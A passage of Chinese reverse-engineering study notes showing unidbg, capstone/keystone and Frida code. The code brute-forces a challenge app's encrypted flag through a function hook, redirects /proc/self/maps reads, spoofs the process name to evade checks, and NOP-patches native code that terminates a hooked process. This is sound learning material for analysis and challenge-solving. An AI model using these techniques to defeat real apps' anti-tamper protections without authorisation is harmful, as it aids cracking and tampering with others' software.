class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.monkeylord.illusion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.AndroidEmulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.Emulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.arm.HookStatus;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.HookContext;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.ReplaceCallback;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.hookzz.HookZz;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidARMEmulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidEmulatorBuilder;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidResolver;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.*;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.Module;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.array.ByteArray;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.memory.Memory;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.pointer.UnidbgPointer;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Pointer;</span><br><span class="line"><span class="keyword">import</span> unicorn.Arm64Const;</span><br><span class="line"><span class="keyword">import</span> unicorn.ArmConst;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">illusion</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AndroidEmulator emulator;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> VM vm;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Module <span class="keyword">module</span>;</span><br><span class="line">    <span class="keyword">private</span> DvmClass cNative;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String r0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">illusion</span> <span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 创建模拟器实例,进程名建议依照实际进程名填写，可以规避针对进程名的校验</span></span><br><span class="line">        emulator = AndroidEmulatorBuilder.for32Bit().setProcessName(<span class="string">&quot;monkeylord.illusion&quot;</span>).build();</span><br><span class="line">        <span class="comment">// 获取模拟器的内存操作接口</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Memory</span> <span class="variable">memory</span> <span class="operator">=</span> emulator.getMemory();</span><br><span class="line">        <span class="comment">// 设置系统类库解析</span></span><br><span class="line">        memory.setLibraryResolver(<span class="keyword">new</span> <span class="title class_">AndroidResolver</span>(<span class="number">23</span>));</span><br><span class="line">        <span class="comment">// 创建Android虚拟机,传入APK，Unidbg可以替我们做部分签名校验的工作</span></span><br><span class="line"><span class="comment">//        vm =  emulator.createDalvikVM(new File(&quot;unidbg-android/src/test/java/com/test/llusion.apk&quot;));</span></span><br><span class="line">        vm =  emulator.createDalvikVM();</span><br><span class="line">        <span class="comment">// 加载目标SO</span></span><br><span class="line">        <span class="type">DalvikModule</span> <span class="variable">dm</span> <span class="operator">=</span> vm.loadLibrary(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/com/monkeylord/illusion/libnative-lib.so&quot;</span>), <span class="literal">true</span>); <span class="comment">// 加载so到虚拟内存</span></span><br><span class="line">        <span class="comment">//获取本SO模块的句柄,后续需要用它</span></span><br><span class="line">        <span class="keyword">module</span> = dm.getModule();</span><br><span class="line">        vm.setJni(<span class="built_in">this</span>); <span class="comment">// 设置JNI</span></span><br><span class="line">        vm.setVerbose(<span class="literal">false</span>); <span class="comment">// 打印日志</span></span><br><span class="line"></span><br><span class="line">        dm.callJNI_OnLoad(emulator); <span class="comment">// 调用JNI OnLoad</span></span><br><span class="line">        DvmObject&lt;?&gt; thiz = vm.resolveClass(<span class="string">&quot;monkeylord/illusion/MainActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">illusion</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">illusion</span>();</span><br><span class="line">        test.hook();</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag_enc</span> <span class="operator">=</span> <span class="string">&quot;Ku@&#x27;G_V9v(yGS&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; flag_enc.length(); index++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">33</span>; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">                test.CheckFlag(flag + String.valueOf((<span class="type">char</span>) i), flag_enc);  <span class="comment">// 进行判断</span></span><br><span class="line">                <span class="comment">//System.out.println(illusion.r0.length());</span></span><br><span class="line">                <span class="keyword">if</span> ((illusion.r0.length() &gt; index)  &amp;&amp; (flag_enc.charAt(index) == illusion.r0.charAt(index))) &#123;</span><br><span class="line">                    flag += String.valueOf((<span class="type">char</span>) i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;Flag[0:&quot;</span>+index+<span class="string">&quot;]: &quot;</span>+flag);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Completely Flag is: &quot;</span>+flag);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">CheckFlag</span><span class="params">(String flag, String flag_enc)</span> &#123;</span><br><span class="line">        <span class="comment">//创建jobject对象</span></span><br><span class="line">        <span class="comment">//DvmObject&lt;?&gt; thiz = vm.resolveClass(&quot;monkeylord/illusion/MainActivity&quot;).newObject(null);</span></span><br><span class="line"><span class="comment">//        List&lt;Object&gt; list = new ArrayList&lt;&gt;(10);</span></span><br><span class="line"><span class="comment">//        list.add(vm.getJNIEnv());</span></span><br><span class="line"><span class="comment">//        list.add(0);</span></span><br><span class="line"><span class="comment">//        list.add(vm.addLocalObject(new StringObject(vm, flag)));   // arg 3</span></span><br><span class="line"><span class="comment">//        list.add(vm.addLocalObject(new StringObject(vm, flag_enc)));   // arg 4</span></span><br><span class="line">        <span class="comment">//list.toArray()</span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span>  <span class="keyword">module</span>.callFunction(emulator, <span class="number">0xdc9</span>, vm.getJNIEnv(),<span class="number">0</span>,vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, flag)),vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, flag_enc)));</span><br><span class="line"><span class="comment">//        System.out.print(&quot;result:&quot;);</span></span><br><span class="line"><span class="comment">//        DvmObject&lt;?&gt; object = vm.getObject(number.intValue());</span></span><br><span class="line"><span class="comment">//        System.out.print(object.getValue().toString());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">HookZz</span> <span class="variable">hook</span> <span class="operator">=</span> HookZz.getInstance(emulator);</span><br><span class="line">        hook.replace(<span class="keyword">module</span>.base + <span class="number">0x00000E64</span>+<span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123;</span><br><span class="line">                <span class="comment">//System.out.println(context.getPointerArg(0).getString(0));  // 入参1 R0寄存器</span></span><br><span class="line">                illusion.r0 = context.getPointerArg(<span class="number">0</span>).getString(<span class="number">0</span>);</span><br><span class="line">                <span class="comment">//System.out.println(context.getPointerArg(1).getString(0));  // 入参2 R1寄存器</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator, context,originFunction);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="结果转化为base64编码形式">结果转化为base64编码形式</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="number">0x1b1cd</span>, list.toArray());</span><br><span class="line">        <span class="type">ByteArray</span> <span class="variable">resultArr</span> <span class="operator">=</span> vm.getObject(number.intValue());</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(resultArr.getValue());</span><br></pre></td></tr></table></figure><h3 id="UTF-8编码">UTF-8编码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span> <span class="keyword">module</span>.callFunction(emulator, <span class="number">0x1a981</span>, list.toArray());</span><br><span class="line"><span class="type">ByteArray</span> <span class="variable">resultArr</span> <span class="operator">=</span> vm.getObject(number.intValue());</span><br><span class="line"><span class="type">String</span> <span class="variable">md5result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(resultArr.getValue(), StandardCharsets.UTF_8);</span><br><span class="line">System.out.println(<span class="string">&quot;md5result:&quot;</span>+md5result);</span><br></pre></td></tr></table></figure><h2 id="Unidbg处理so与系统的交互">Unidbg处理so与系统的交互</h2><h3 id="文件访问">文件访问</h3><p>unidbg的文件系统创建的目录在/tmp/rootfs/default</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取自己的maps文件</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">xxx</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> <span class="keyword">implements</span> <span class="title class_">IOResolver</span>&#123;   <span class="comment">//实现一个接口方法  </span></span><br><span class="line">    emulator = AndroidEmulatorBuilder   <span class="comment">//构建模拟器实例</span></span><br><span class="line">                .for32Bit()</span><br><span class="line">        <span class="comment">//将该目录设置为根路径</span></span><br><span class="line">        .setRootDir(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;../../filesystem&quot;</span>))</span><br><span class="line">                <span class="comment">//添加DynarmicFactory后端工厂，为true含义：如果出现问题 退回Unicorn工厂</span></span><br><span class="line">                .addBackendFactory(<span class="keyword">new</span> <span class="title class_">DynarmicFactory</span>(<span class="literal">true</span>))</span><br><span class="line">                .build();</span><br><span class="line">    <span class="comment">//将当前类的实例对象作为IOResolver进行添加</span></span><br><span class="line">    emulator.getSyscallHandler().addIOResolver(<span class="built_in">this</span>);</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line">    <span class="comment">//读取文件就会执行resolver方法</span></span><br><span class="line">    <span class="keyword">public</span> FileResult <span class="title function_">resolver</span><span class="params">(Emulator emulator,String pathname,<span class="type">int</span> oflags)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>((pathname).equals(<span class="string">&quot;/proc/self/maps&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//将文件重定向到自己想要的位置</span></span><br><span class="line">            File reg=<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(!reg.exists())&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    reg.createNewFile();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                     &#125;</span><br><span class="line">            &#125;</span><br><span class="line">               </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">return</span> FileResult.success(<span class="keyword">new</span> <span class="title class_">SimpleFileIO</span>(oflags,reg,pathname)); <span class="comment">//文件方式返回</span></span><br><span class="line">            <span class="keyword">return</span> FileResult.success(<span class="keyword">new</span> <span class="title class_">ByteArrayFileIO</span>(oflag,pathname,<span class="string">&quot;xxx&quot;</span>.getbytes)); <span class="comment">//字符串常量返回</span></span><br><span class="line">&#125;</span><br><span class="line">        System.out.println(pathname);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>看雪3w</h1><h2 id="第一课时">第一课时</h2><h3 id="capstone和keystone基本使用">capstone和keystone基本使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> capstone <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> keystone</span><br><span class="line">CODE = <span class="string">b&quot;\x55\x48\x8b\x05\xb8\x13\x00\x00&quot;</span></span><br><span class="line">md = Cs(CS_ARCH_X86, CS_MODE_64)</span><br><span class="line"><span class="comment">#ks=Ks(CODE_ARCH_X86,KS_MODE_64)</span></span><br><span class="line">kp = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_64)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md.disasm(CODE,<span class="number">0</span>,<span class="built_in">len</span>(CODE)):</span><br><span class="line">    <span class="comment">#print(i)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;0x%x:\t%s\t%s&quot;</span> % (i.address, i.mnemonic, i.op_str))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--------------------------------&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(kp.asm(i.mnemonic+<span class="string">&quot; &quot;</span>+i.op_str))</span><br><span class="line">    </span><br><span class="line">capstone另一种写法</span><br><span class="line">//Capstone cs=new Capstone(Capstone.CS_ARCH_ARM,Capstone.CS_MODE_THUMB);</span><br><span class="line">Instruction[] disasm=cs.disasm(code,address);</span><br><span class="line"><span class="keyword">for</span>(Instruction i:disasm)&#123;</span><br><span class="line">    System.out.<span class="built_in">print</span>(String.<span class="built_in">format</span>(<span class="string">&quot;0x%x:%s %s&quot;</span>,i.getAddress(),i.getMnemonic(),i.getOpStr()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="利用frida内嵌的capstone"><strong>利用frida内嵌的capstone</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dis</span>(<span class="params">address,number</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;number;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ins=<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(address);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>+ins.<span class="property">address</span>+<span class="string">&quot;--dis:&quot;</span>+ins.<span class="title function_">toString</span>());</span><br><span class="line">        address=ins.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="动态进行patch">动态进行patch</h3><p>当hook 这个.so文件时进程被终端 所以使用dlopen先加载这个libnative-lib.so文件,在patch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dis</span>(<span class="params">address,number</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;number;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ins=<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(address);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>+ins.<span class="property">address</span>+<span class="string">&quot;--dis:&quot;</span>+ins.<span class="title function_">toString</span>());</span><br><span class="line">        address=ins.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="literal">null</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(android_dlopen_ext);</span><br><span class="line">    <span class="keyword">if</span>(android_dlopen_ext != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> soName = args[<span class="number">0</span>].<span class="title function_">readCString</span>();  <span class="comment">//dlopen函数第一个参数是.so路径</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(soName);</span><br><span class="line">                <span class="keyword">if</span>(soName.<span class="title function_">indexOf</span>(<span class="string">&quot;libnative-lib.so&quot;</span>) != -<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) &#123; <span class="title function_">hook</span>() &#125;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> libnativemodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;libnative-lib.so&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> base = libnativemodule.<span class="property">base</span>;</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x92B6</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base.<span class="title function_">add</span>(<span class="number">0x92C2</span>),<span class="number">4</span>,<span class="string">&quot;rwx&quot;</span>);</span><br><span class="line">    <span class="comment">//或者使用frida内置keystone代替上面两行代码</span></span><br><span class="line">        <span class="keyword">var</span> patchaddr=base.<span class="title function_">add</span>(<span class="number">0x92C2</span>);</span><br><span class="line">        <span class="title class_">Memory</span>.<span class="title function_">patchCode</span>(patchaddr, <span class="number">4</span>, <span class="function"><span class="params">patchaddr</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">var</span> cw = <span class="keyword">new</span> <span class="title class_">ThumbWriter</span>(patchaddr);</span><br><span class="line">            cw.<span class="title function_">putNop</span>();</span><br><span class="line">            cw = <span class="keyword">new</span> <span class="title class_">ThumbWriter</span>(patchaddr.<span class="title function_">add</span>(<span class="number">2</span>));</span><br><span class="line">            cw.<span class="title function_">putNop</span>();</span><br><span class="line">            cw.<span class="title function_">flush</span>();</span><br><span class="line">        &#125;);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//修改为nopnop</span></span><br><span class="line">    base.<span class="title function_">add</span>(<span class="number">0x92C2</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x92B6</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;+++++++++++++++++++++++++++++++&quot;</span>);</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x948E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">    <span class="title class_">Memory</span>.<span class="title function_">protect</span>(base.<span class="title function_">add</span>(<span class="number">0x9498</span>),<span class="number">4</span>,<span class="string">&quot;rwx&quot;</span>);</span><br><span class="line">    base.<span class="title function_">add</span>(<span class="number">0x9498</span>).<span class="title function_">writeByteArray</span>([<span class="number">0x00</span>,<span class="number">0xbf</span>,<span class="number">0x00</span>,<span class="number">0xbf</span>]);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;========================&quot;</span>);</span><br><span class="line">    <span class="title function_">dis</span>(base.<span class="title function_">add</span>(<span class="number">0x948E</span>).<span class="title function_">add</span>(<span class="number">1</span>), <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(hookTest6);</span><br></pre></td></tr></table></figure><p>也可以hooklinker找到call_function函数，hook他的参数==&gt;加载so路径</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">dis</span>(<span class="params">address,number</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;number;i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> ins=<span class="title class_">Instruction</span>.<span class="title function_">parse</span>(address);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;address:&quot;</span>+ins.<span class="property">address</span>+<span class="string">&quot;--dis:&quot;</span>+ins.<span class="title function_">toString</span>());</span><br><span class="line">        address=ins.<span class="property">next</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> linkermodule = <span class="title class_">Process</span>.<span class="title function_">getModuleByName</span>(<span class="string">&quot;linker&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> call_function_addr = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> symbols = linkermodule.<span class="title function_">enumerateSymbols</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i];</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(symbol.<span class="property">name</span>);</span><br><span class="line">        <span class="comment">//LogPrint(linkername + &quot;-&gt;&quot; + symbol.name + &quot;---&quot; + symbol.address);</span></span><br><span class="line">        <span class="keyword">if</span> (symbol.<span class="property">name</span>.<span class="title function_">indexOf</span>(<span class="string">&quot;__dl__ZL13call_functionPKcPFviPPcS2_ES0_&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            call_function_addr = symbol.<span class="property">address</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(call_function_addr);</span><br><span class="line">            <span class="comment">//LogPrint(&quot;linker-&gt;&quot; + symbol.name + &quot;---&quot; + symbol.address)</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(call_function_addr,&#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> type = <span class="title function_">ptr</span>(args[<span class="number">0</span>]).<span class="title function_">readUtf8String</span>();</span><br><span class="line">            <span class="keyword">var</span> address = args[<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">var</span> sopath = <span class="title function_">ptr</span>(args[<span class="number">2</span>]).<span class="title function_">readUtf8String</span>();</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;loadso:&quot;</span> + sopath + <span class="string">&quot;--addr:&quot;</span> + address + <span 